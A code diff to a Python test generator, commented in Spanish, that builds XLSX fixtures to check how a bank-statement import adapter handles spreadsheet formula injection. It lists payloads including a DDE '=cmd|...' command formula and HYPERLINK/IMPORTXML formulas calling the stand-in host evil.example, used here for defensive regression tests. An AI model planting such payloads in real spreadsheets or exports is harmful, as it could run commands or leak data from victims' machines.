@@ -87,6 +87,8 @@ class CasoXlsx:
     descripcion: str
     # Tamano descomprimido que declara el zip, si el caso lo apunta.
     uncomprimido_aprox: int | None = None
+    # Que capa lo neutraliza: "data_only" (lectura) o "reporte" (escritura).
+    capa: str = "datos"
 
 
 def _hoja_bancaria() -> str:
@@ -282,3 +284,94 @@ def gen_xml() -> list[CasoXml]:
 def iter_todos() -> Iterator[CasoXlsx | CasoXml]:
     yield from gen_xlsx()
     yield from gen_xml()
+
+
+# --- Formulas: la propiedad de seguridad que no estaba fijada ---------------
+#
+# El adaptador abre con `load_workbook(..., data_only=True)`. Eso hace que una
+# celda que Excel guardo como formula llegue como su **valor en cache**, no como
+# el texto `=...`. Con `data_only=False`, una descripcion `=cmd|'/c calc'!A1`
+# llegaria verbatim y terminaria en el reporte.
+#
+# Detalle que confunde: openpyxl **tambien** trata como formula cualquier celda
+# cuyo texto empieza con `=`, al guardar. Asi que un `=1+1` "de texto" se
+# convierte en formula de verdad y, sin valor en cache, `data_only=True` devuelve
+# `None`. Con `+`, `-` o `@` al inicio no pasa: se guardan como texto y llegan
+# enteros, que es por eso que la segunda capa importa.
+
+
+FORMULAS_PELIGROSAS: tuple[tuple[str, str], ...] = (
+    # (payload, capa que lo neutraliza)
+    #
+    # La distincion importa y no es academica. Un payload que empieza con `=`
+    # sin espacios delante lo guarda openpyxl como **formula**, y `data_only=True`
+    # lo reemplaza por su valor en cache (o por `None` si no hay cache), asi que
+    # su texto nunca llega al modelo. Un payload con `+`, `-` o `@` al inicio
+    # **no** es formula: se guarda como texto y llega entero, y lo mismo pasa
+    # con un espacio o tabulador delante del `=`.
+    #
+    # Por eso el sanitizador del reporte existe: es la unica defensa de la
+    # segunda mitad, y `prevenir_csv_injection` quita los caracteres sin
+    # significado del inicio **antes** de mirar el primero, porque Excel tambien
+    # los descarta. Un sanitizer que mirara solo `texto[0]` dejaria pasar
+    # justamente estos.
+    ("=cmd|'/c calc'!A1", "data_only"),
+    ('=HYPERLINK("http://evil.example","click")', "data_only"),
+    ("=1+1", "data_only"),
+    ('=IMPORTXML("http://evil.example","//a")', "data_only"),
+    ("+SUM(A1:A9)", "reporte"),
+    ("-1+1", "reporte"),
+    ("@SUM(A1)", "reporte"),
+    ("\t=1+1", "reporte"),
+    (" =1+1", "reporte"),
+)
+
+
+def libro_con_fila(header: list[str], fila: list[object]) -> bytes:
+    """XLSX minimo con una fila de datos, escribiendo los tipos que le tocan."""
+    import io
+
+    import openpyxl
+
+    wb = openpyxl.Workbook()
+    ws = wb.active
+    ws.append(header)
+    ws.append(fila)
+    buf = io.BytesIO()
+    wb.save(buf)
+    return buf.getvalue()
+
+
+def gen_xlsx_formulas() -> list[CasoXlsx]:
+    """Formulas y pseudo-formulas en cada columna que llega al reporte.
+
+    El oraculo es distinto del de los otros vectores: casi todo esto tiene que
+    **producir la transaccion**, porque el riesgo no es que rechace, es que
+    acepte y deje pasar una formula viva. La proteccion real son dos capas
+    (`data_only=True` al leer, `prevenir_csv_injection` al escribir), y lo que
+    estos casos fijan es que las dos sigan ahi.
+    """
+    header = ["fecha", "monto", "descripcion", "referencia"]
+    casos: list[CasoXlsx] = []
+    for i, (formula, capa) in enumerate(FORMULAS_PELIGROSAS):
+        casos.append(
+            CasoXlsx(
+                nombre=f"formula_desc_{i}_{capa}",
+                data=libro_con_fila(header, ["05/01/2026", 150000, formula, "REF-1"]),
+                modo="debe_aceptarse",
+                descripcion=f"descripcion con payload: {formula!r} (neutraliza: {capa})",
+                capa=capa,
+            )
+        )
+    # La formula en la columna del monto es distinta: ahi el resultado debe ser
+    # un rechazo, porque `=1+1` no es un monto de CLP ni siquiera con valor en
+    # cache. Y sin cache, `None` tiene que fallar en vez de becoming 0.
+    casos.append(
+        CasoXlsx(
+            nombre="formula_en_monto",
+            data=libro_con_fila(header, ["05/01/2026", "=1+1", "Pago", "REF-1"]),
+            modo="debe_rechazarse",
+            descripcion="una formula en la columna del monto no es un monto",
+        )
+    )
+    return casos
